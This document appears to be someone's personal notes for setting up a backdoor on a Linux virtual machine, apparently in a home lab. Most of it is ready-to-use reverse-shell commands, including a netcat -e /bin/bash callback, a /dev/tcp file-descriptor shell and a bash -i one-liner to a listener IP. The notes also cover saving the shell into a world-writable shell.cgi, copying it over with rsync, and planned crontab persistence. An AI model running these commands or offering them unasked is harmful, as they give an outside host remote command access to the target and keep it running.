# Notes for the backdoor
Will most likely need to make use of crontab so the file automatically gets executed at a time or at startup. 

HM = Host machine
VM = Virtual machine that is being attacked

# 1 Netcat method
This creates a reverse shell with netcat

HM
1. HM setup listening port: `nc –l 4444`
2. Get the hosts ip address: `ifconfig | grep --color netmask`
	it will be something like `192.168.x.xxx`

3. gain remote access to the VM, via ssh or ...?
4. On Linux VM, setup the reverse shell with hosts IP address: `nc 192.168.x.xxx -e /bin/bash`

5. on HM type any bash command and hit enter

# 2 without Netcat installed
- // 0<&196; open file descriptor and redirect it to stdin. 196 is a random number
- // exec 196<>/dev/tcp/192.168.0.xxx/4444; read-write file descriptor,  https://unix.stackexchange.com/questions/164391/how-does-cat-file-work
- // sh <&196 receive commands from host machine, display output on target
- // sh >&196 receive commands on target, redirect output to the host machine
- // sh 2>&196 redirect stderr to the host
- // sh <&196 1>&196 2>&196 allow commands output to display on the target machine
on HM: `nc –l 4444`
on VM: `0<&196;exec 196<>/dev/tcp/192.168.0.xxx/4444; sh <&196 1>&196 2>&196`

# 3 even better method
https://medium.com/@hackbotone/shellshock-attack-on-a-remote-web-server-d9124f4a0af3
- // >& <location> redirects stdout and stderr to be redirected to <location>
- // 0<&1 redirects std in back to the shell
on HM: `nc –l 4444`
on VM: `/bin/bash -i >& /dev/tcp/192.168.0.xxx/4444 0<&1`
copy it to the remote machine: `rsync -av shell.cgi sparky@kali:/home/sparky/desktop`	// change to use your machines details instead of sparky@kali						

## Elaborate a little bit --> create the script, set permissions
on HM: `echo "/bin/bash -i >& /dev/tcp/192.168.0.xxx/4444 0<&1" > shell.cgi; chmod 777 shell.cgi`

## copy the script to the remote machine
rsync -av shell.cgi sparky@kali:/home/sparky/desktop

## now the remote machine just needs to run shell.cgi
Sounds like Crontab could do this, or https://serverfault.com/questions/364040/how-to-execute-a-process-on-remote-linux-machine-without-ssh
./shell.cgi

# TODO
- [ ] figure out how to make the script execute on the remote machine.
rsync --chmod=u+rwx,g+rwx,o+rwx /path/to/file server:/path/to/file
